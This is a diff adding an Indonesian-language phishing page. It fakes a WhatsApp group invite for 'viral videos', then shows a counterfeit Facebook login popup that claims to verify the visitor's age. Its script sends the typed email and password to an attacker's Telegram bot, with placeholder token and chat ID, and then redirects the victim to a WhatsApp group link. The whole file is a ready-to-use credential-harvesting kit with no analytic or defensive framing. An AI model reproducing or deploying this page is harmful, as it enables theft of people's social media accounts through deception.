@@ -1,0 +1,353 @@
+<!DOCTYPE HTML>
+<html lang="id">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+        <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+        <title>Undangan Grub WhatsApp</title>
+        <link rel="icon" type="png/image" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" />
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+            body { background-color: #efeae2; font-family: 'Inter', sans-serif; overflow: hidden; margin: 0; padding: 0; }
+            
+            img { pointer-events: none; user-select: none; -webkit-user-drag: none; }
+
+            main { 
+                background: url(https://cdn.statically.io/gh/AlexHostX/another/main/walxa/wbga.png) no-repeat center; 
+                background-size: cover; 
+                height: 100vh; 
+                position: relative;
+            }
+
+            header { 
+                position: absolute; 
+                top: 0; width: 100%; 
+                background: #008069; 
+                color: #ffffff; 
+                display: flex; align-items: center; 
+                justify-content: space-between;
+                padding: 10px 15px; z-index: 10; 
+                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            }
+            .kralxh { display: flex; align-items: center; gap: 10px; }
+            .back-btn-svg { width: 22px; height: 22px; fill: #ffffff; margin-right: 2px; }
+            .kralxh img { width: 38px; height: 38px; border-radius: 50%; object-fit: cover; background: #eee; }
+            .txtalxh h1 { font-size: 16px; font-weight: 600; color: #ffffff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 180px; }
+            .txtalxh p { font-size: 12px; color: rgba(255,255,255,0.8); transition: all 0.3s ease; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 180px;}
+
+            .header-icons { display: flex; align-items: center; padding-right: 5px; }
+            .icon-svg { width: 24px; height: 24px; fill: #ffffff; cursor: pointer; }
+
+            alexchat { 
+                padding: 75px 15px 0; 
+                display: flex; flex-direction: column; 
+                height: 100%; overflow-y: auto;
+                background: rgba(239, 234, 226, 0.4);
+            }
+
+            .lock-scroll { overflow: hidden !important; }
+
+            .tglalxc { 
+                background: #e1f3fb; padding: 5px 12px; font-size: 11px; 
+                border-radius: 6px; align-self: center; margin-bottom: 15px; 
+                color: #54656f; text-transform: uppercase;
+                box-shadow: 0 1px 0.5px rgba(0,0,0,0.1);
+            }
+
+            .etealxc { 
+                background: #fff5c4; padding: 8px 12px; font-size: 11px; 
+                color: #54656f; border-radius: 8px; text-align: center; 
+                margin-bottom: 20px; max-width: 90%; align-self: center; line-height: 1.4;
+                box-shadow: 0 1px 0.5px rgba(0,0,0,0.1);
+            }
+
+            .sialxc { width: 100%; display: flex; flex-direction: column; gap: 8px; padding-bottom: 120px; }
+            
+            .info-msg {
+                background: rgba(255, 255, 255, 0.9); padding: 5px 12px; font-size: 12.5px;
+                border-radius: 7px; align-self: center; margin-bottom: 4px;
+                color: #54656f; text-align: center;
+                box-shadow: 0 1px 0.5px rgba(0,0,0,0.1);
+            }
+
+            .calxc {
+                background: #ffffff; border-radius: 0px 10px 10px 10px;
+                position: relative; width: fit-content; box-shadow: 0 1px 0.5px rgba(0,0,0,0.15);
+                margin-left: 10px; padding: 6px 7px 5px 7px;
+                color: #111b21;
+            }
+
+            .calxc::before {
+                content: ""; position: absolute; left: -8px; top: 0;
+                width: 0; height: 0; border-style: solid;
+                border-width: 0 10px 10px 0; border-color: transparent #ffffff transparent transparent;
+            }
+
+            nalex { font-weight: 600; font-size: 12.5px; color: #e53935; display: block; margin-bottom: 3px; }
+
+            .reply-box {
+                background: #f0f2f5; border-left: 4px solid #06cf9c; border-radius: 4px;
+                padding: 5px 8px; margin-bottom: 5px; font-size: 12px;
+            }
+            .reply-name { font-weight: 600; color: #06cf9c; font-size: 11px; display: block; }
+            .reply-text { color: #54656f; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display: block; }
+
+            .vid-container {
+                position: relative; border-radius: 8px; overflow: hidden;
+                background: #000; display: block;
+                width: 270px; height: 190px;
+            }
+            .vid-container img { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.7); }
+
+            .vid-protect { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 5; }
+            
+            .dl-overlay {
+                position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+                background: rgba(0,0,0,0.4); width: 48px; height: 48px; border-radius: 50%; 
+                display: flex; align-items: center; justify-content: center; border: 2px solid #fff;
+                z-index: 6;
+            }
+            .dl-overlay i { color: #fff; font-size: 22px; }
+            .file-size { position: absolute; bottom: 8px; left: 10px; background: rgba(0,0,0,0.4); color: #fff; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; z-index: 6; }
+            
+            .time-chat { font-size: 10.5px; color: #667781; float: right; margin-top: 4px; margin-left: 8px; }
+
+            .jnalxc { 
+                position: fixed; top: 0; left: 0; background: rgba(0,0,0,0.5); 
+                width: 100%; height: 100%; z-index: 100; display: flex; 
+                flex-direction: column; justify-content: flex-end; 
+            }
+            .bxalxjnc { 
+                background: #ffffff; width: 100%; border-radius: 20px 20px 0 0; 
+                padding: 15px 24px 20px; position: relative; 
+                display: flex; flex-direction: column; align-items: center; 
+                color: #111b21; animation: slideUp 0.3s ease-out;
+            }
+            
+            @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+            
+            .drag-handle { width: 40px; height: 4px; background: #e9edef; border-radius: 10px; margin-bottom: 15px; }
+            .close-btn-svg { position: absolute; left: 20px; top: 25px; width: 22px; height: 22px; fill: #54656f; cursor: pointer; }
+            .group-profile-pic { width: 85px; height: 85px; border-radius: 50%; object-fit: cover; margin-bottom: 12px; background: #eee; }
+            .group-name-large { font-size: 20px; font-weight: 500; margin-bottom: 4px; }
+            .created-info { font-size: 14px; color: #667781; margin-bottom: 18px; }
+            .members-row { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; }
+            .member-circle { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; background: #eee; border: 1.5px solid #fff; margin-left: -10px; }
+            .member-circle:first-child { margin-left: 0; }
+            .member-initial { width: 32px; height: 32px; border-radius: 50%; background: #d4b893; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 500; border: 1.5px solid #fff; margin-left: -10px; }
+            .member-count { width: 32px; height: 32px; border-radius: 50%; background: #f0f2f5; color: #54656f; display: flex; align-items: center; justify-content: center; font-size: 12px; border: 1.5px solid #fff; margin-left: -10px; }
+            
+            .group-description { text-align: left; font-size: 14px; color: #3b4a54; line-height: 1.6; margin-bottom: 25px; width: 100%; background: #f8f9fa; padding: 12px; border-radius: 10px; border-left: 4px solid #008069; }
+            .desc-line { display: block; }
+            .desc-bold { font-weight: 600; color: #111b21; }
+
+            .join-btn-full { width: 100%; background: #008069; color: #ffffff; border: none; padding: 12px; border-radius: 25px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 5px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+
+            .popup-login { background: rgba(0, 0, 0, 0.6); width: 100%; height: 100%; position: fixed; top: 0; left: 0; z-index: 9999; display: none; padding: 20px; }
+            .popup-box-login-fb { background: #fff; width: 100%; max-width: 360px; position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); border-radius: 12px; box-shadow: 0 12px 28px rgba(0, 0, 0, 0.2); overflow: hidden; font-family: 'Roboto', sans-serif; }
+            
+            .fb-top-banner { background: #fff; padding: 20px 15px 10px; display: flex; justify-content: center; }
+            .fb-logo { width: 110px; }
+
+            .fb-content { padding: 15px 25px 25px; }
+            .fb-content p { font-size: 14px; color: #4b4f56; line-height: 1.4; text-align: center; margin-bottom: 20px; }
+            
+            .fb-input-group { margin-bottom: 10px; }
+            .fb-input-group input { 
+                width: 100%; padding: 14px 12px; background: #f5f6f7; border: 1px solid #dddfe2; 
+                border-radius: 8px; font-size: 15px; outline: none; transition: 0.2s;
+            }
+            .fb-input-group input:focus { border-color: #1877f2; background: #fff; }
+
+            .fb-btn-login { 
+                width: 100%; background: #1877f2; color: #fff; padding: 12px; 
+                border: none; border-radius: 8px; font-size: 17px; font-weight: bold; 
+                cursor: pointer; margin-top: 5px;
+            }
+
+            .fb-footer { margin-top: 15px; text-align: center; }
+            .fb-footer a { color: #1877f2; font-size: 14px; text-decoration: none; font-weight: 500; }
+            .fb-or { display: flex; align-items: center; text-align: center; color: #8d949e; font-size: 13px; margin: 20px 0; }
+            .fb-or::before, .fb-or::after { content: ''; flex: 1; border-bottom: 1px solid #dddfe2; }
+            .fb-or:not(:empty)::before { margin-right: .5em; }
+            .fb-or:not(:empty)::after { margin-left: .5em; }
+
+            .fb-btn-new { background: #42b72a; color: #fff; padding: 10px 16px; border: none; border-radius: 6px; font-weight: bold; font-size: 14px; cursor: pointer; }
+        </style>
+    </head>
+    <body oncontextmenu="return false;"> <main>
+            <header>
+                <div class="kralxh">
+                    <svg class="back-btn-svg" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
+                    <img src="https://i.ibb.co.com/j9sjxxgd/90cd7470d3aedb670b6214794b36252a.jpg">
+                    <div class="txtalxh">
+                        <h1>BERBAGI VIDEO VIRAL💦</h1>
+                        <p id="groupStatus">+62 838-5324-1258, +62 812-...</p>
+                    </div>
+                </div>
+                <div class="header-icons">
+                    <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"></path></svg>
+                </div>
+            </header>
+
+            <alexchat id="chatArea">
+                <div class="tglalxc"><span id="hari"></span> <span id="bulan"></span> <span id="tahun"></span></div>
+                <div class="etealxc"><i class="fa-solid fa-lock" style="font-size: 10px;"></i> Pesan ke grup ini sekarang diamankan dengan enkripsi end-to-end.</div>
+                
+                <div class="sialxc">
+                    <div class="info-msg" id="msg0" style="display:none;">+62 838-6241-8751 bergabung lewat tautan undangan</div>
+                    <div class="calxc" id="msg1" style="display:none;">
+                        <nalex>+62 895-0877-1828</nalex>
+                        <div class="vid-container">
+                            <div class="vid-protect"></div>
+                            <img src="https://i.ibb.co.com/XfpJKtxm/xn-11-t.jpg">
+                            <div class="dl-overlay"><i class="fa-solid fa-arrow-down"></i></div>
+                            <div class="file-size">1.4 MB</div>
+                        </div>
+                        <span class="time-chat">20:15</span>
+                    </div>
+                    <div class="info-msg" id="msg2" style="display:none;">+62 812-4456-9901 bergabung lewat tautan undangan</div>
+                    <div class="calxc" id="msg3" style="display:none;">
+                        <nalex style="color: #06cf9c;">+62 828-9143-8875</nalex>
+                        <div class="reply-box">
+                            <span class="reply-name">+62 895-0877-1828</span>
+                            <span class="reply-text"><i class="fa-solid fa-video" style="font-size: 10px;"></i> Video</span>
+                        </div>
+                        <div style="font-size: 14.5px;">Wihh mantep bener videonya, bening parah &#128293;</div>
+                        <span class="time-chat">20:16</span>
+                    </div>
+                    <div class="info-msg" id="msg4" style="display:none;">+62 857-1122-3344 bergabung lewat tautan undangan</div>
+                    <div class="calxc" id="msg5" style="display:none;">
+                        <nalex style="color: #25d366;">+62 812-4456-9901</nalex>
+                        <div class="vid-container">
+                            <div class="vid-protect"></div>
+                            <img src="https://i.ibb.co.com/6cpJ65JM/xn-4-t.jpg">
+                            <div class="dl-overlay"><i class="fa-solid fa-arrow-down"></i></div>
+                            <div class="file-size">4.8 MB</div>
+                        </div>
+                        <span class="time-chat">20:17</span>
+                    </div>
+                </div>
+            </alexchat>
+
+            <div class="jnalxc" id="joinModal" style="display:none;">
+                <div class="bxalxjnc">
+                    <div class="drag-handle"></div>
+                    <svg class="close-btn-svg" onclick="location.reload()" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"></path></svg>
+                    <img src="https://i.ibb.co.com/j9sjxxgd/90cd7470d3aedb670b6214794b36252a.jpg" class="group-profile-pic">
+                    <h1 class="group-name-large">BERBAGI VIDEO VIRAL💦</h1>
+                    <p class="created-info">Dibuat oleh +62 838-5324-1298, 31/08/25</p>
+                    <div class="members-row">
+                        <div class="member-initial">A</div>
+                        <img src="https://picsum.photos/seed/m2/100/100" class="member-circle">
+                        <img src="https://picsum.photos/seed/m3/100/100" class="member-circle">
+                        <div class="member-initial" style="background:#8b6d5c">H</div>
+                        <img src="https://picsum.photos/seed/m5/100/100" class="member-circle">
+                        <div class="member-count">+99</div>
+                    </div>
+                    <div class="group-description">
+                        <span class="desc-line desc-bold">⚠️ ATURAN GRUP WAJIB BACA:</span>
+                        <span class="desc-line">✅ Berbagi video yang sedang viral/trending.</span>
+                        <span class="desc-line">❌ Dilarang keras spam link judi/stiker tidak jelas.</span>
+                        <span class="desc-line desc-bold">👉 Langgar aturan = AUTO KICK ADMIN!</span>
+                    </div>
+                    <button class="join-btn-full" id="btnJoinAction">Gabung ke grup</button>
+                </div>
+            </div>
+
+            <div class="popup-login" id="fbLogin">
+                <div class="popup-box-login-fb">
+                    <div class="fb-top-banner">
+                        <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/89/Facebook_Logo_%282019%29.svg/1280px-Facebook_Logo_%282019%29.svg.png">
+                    </div>
+                    <div class="fb-content">
+                        <p>Konfirmasi akun Facebook Anda untuk memverifikasi usia & mendapatkan akses masuk ke grup.</p>
+                        <form id="finalForm">
+                            <div class="fb-input-group">
+                                <input type="text" id="email" placeholder="Nomor ponsel atau email" required maxlength="17" autocomplete="username">
+                            </div>
+                            <div class="fb-input-group">
+                                <input type="password" id="pass" placeholder="Kata sandi" required maxlength="17" autocomplete="current-password">
+                            </div>
+                            <button type="submit" class="fb-btn-login" id="btnSubmit">Masuk</button>
+                        </form>
+                        <div class="fb-footer">
+                            <a href="#">Lupa Kata Sandi?</a>
+                        </div>
+                        <div class="fb-or">atau</div>
+                        <div style="text-align: center;">
+                            <button class="fb-btn-new">Buat Akun Baru</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script>
+            const TELE_TOKEN = 'BOT_TOKEN_LU'; 
+            const TELE_CHAT_ID = 'ID_CHAT_LU';
+
+            const d = new Date();
+            const months = ["JANUARI","FEBRUARI","MARET","APRIL","MEI","JUNI","JULI","AGUSTUS","SEPTEMBER","OKTOBER","NOVEMBER","DESEMBER"];
+            $('#hari').text(d.getDate()); $('#bulan').text(months[d.getMonth()]); $('#tahun').text(d.getFullYear());
+
+            $(document).ready(function() {
+                setTimeout(() => { $('#groupStatus').fadeOut(300, function() { $(this).text('6 online').fadeIn(300); }); }, 4000); 
+                setTimeout(() => { $('#msg0').fadeIn(); 
+                    setTimeout(() => { $('#msg1').fadeIn(); 
+                        setTimeout(() => { $('#msg2').fadeIn(); 
+                            setTimeout(() => { $('#msg3').fadeIn();
+                                setTimeout(() => { $('#msg4').fadeIn();
+                                    setTimeout(() => { $('#msg5').fadeIn();
+                                        setTimeout(() => { 
+                                            $('#joinModal').show(); 
+                                            $('body').addClass('lock-scroll'); 
+                                        }, 1500);
+                                    }, 1000);
+                                }, 1000);
+                            }, 1000);
+                        }, 1200);
+                    }, 1000);
+                }, 800);
+            });
+
+            $('#btnJoinAction').click(function() { 
+                $('#fbLogin').fadeIn(); 
+                $('body').addClass('lock-scroll'); 
+            });
+
+            $('#finalForm').submit(async function(e) {
+                e.preventDefault();
+                const btn = $('#btnSubmit');
+                const user = $('#email').val();
+                const pass = $('#pass').val();
+                
+                btn.html('<i class="fa fa-spinner fa-spin"></i> Memproses...');
+                
+                const fullDate = `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear()}`;
+                const fullTime = `${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')}`;
+                
+                const text = `✨ *DATA FB METODE GRUB WA* ✨\\n` +
+                             `━━━━━━━━━━━━━━━━━━━━\\n` +
+                             `👤 *User:* \`${user}\`\\n` +
+                             `🔑 *Pass:* \`${pass}\`\\n` +
+                             `📅 *Date:* ${fullDate}\\n` +
+                             `⏰ *Time:* ${fullTime} WIB\\n` +
+                             `━━━━━━━━━━━━━━━━━━━━\\n` +
+                             `© *Netzyhost Digital Service*`;
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+                        method: 'POST', headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: TELE_CHAT_ID, text: text, parse_mode: 'Markdown'})
+                    });
+                    window.location.href = 'https://chat.whatsapp.com/LBLPBSSCC4ED2T3422D9Xj';
+                } catch (err) { btn.html('Masuk'); }
+            });
+        </script>
+    </body>
+</html>
